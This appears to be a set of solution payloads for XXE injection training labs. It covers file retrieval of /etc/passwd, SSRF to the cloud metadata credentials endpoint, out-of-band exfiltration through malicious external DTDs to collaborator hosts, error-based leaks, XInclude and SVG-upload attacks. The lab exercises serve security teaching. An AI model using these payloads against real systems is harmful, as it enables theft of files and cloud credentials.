# Lab: Exploiting XXE using external entities to retrieve files

```xml
<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE stockCheck [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
  <stockCheck>
    <productId>1&test;</productId>
    <storeId>1</storeId>
  </stockCheck>
```

# Lab: Exploiting XXE to perform SSRF attacks

REF: [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#exploiting-xxe-to-perform-ssrf-attacks](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#exploiting-xxe-to-perform-ssrf-attacks)

```xml
<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin" > ]>
  <stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
  </stockCheck>
```

# Lab: Blind XXE with out-of-band interaction

```xml
<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE stockCheck [<!ENTITY test SYSTEM 'http://ub9he1v5831fr5dpu4tax8k990fr3jr8.oastify.com'>]>
  <stockCheck>
    <productId>&test;</productId>
    <storeId>1</storeId>
  </stockCheck>
```

# Lab: Blind XXE with out-of-band interaction via XML parameter entities

```xml
<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE stockCheck [<!ENTITY % ext SYSTEM "http://69dtcdth6fzrphb1sgrmvkil7cd31wpl.oastify.com/x"> %ext;]>
  <stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
  </stockCheck>
```

# Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD

Ref: [https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#malicious-dtd-example](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#malicious-dtd-example)

```xml
<!-- 
Request body
-->
<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://exploit-0a1200ca036a3ded8195062001f10032.exploit-server.net/ext.dtd"> %xxe;]>
  <stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
  </stockCheck>

<!-- 
xxx.exploit-server.net/ext.dtd
-->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://idz5gpxtar33ttfdwsvyzwmxbohf5atz.oastify.com/?x=%file;'>">
%eval;
%exfiltrate;
```

# Lab: Exploiting blind XXE to retrieve data via error messages

```xml
<!--
Request body
-->
<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE message [ <!ENTITY % ext SYSTEM "http://exploit-0ad4006e03a8d0ac818aba080181007d.exploit-server.net/exploit.dtd"> %ext;]>
  <stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
  </stockCheck>

<!--
xxxxx.exploit-server.net/exploit.dtd
-->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

# Lab: Exploiting XInclude to retrieve files

```http
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

# Lab: Exploiting XXE via image file upload

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

# Lab: Exploiting XXE to retrieve data by repurposing a local DTD

```xml
<!--
  Request body
-->
<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE stockCheck [ 
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
      <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
      <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
      &#x25;eval;
      &#x25;error;
    '>
    %local_dtd;
  ]>
  <stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
  </stockCheck>
```

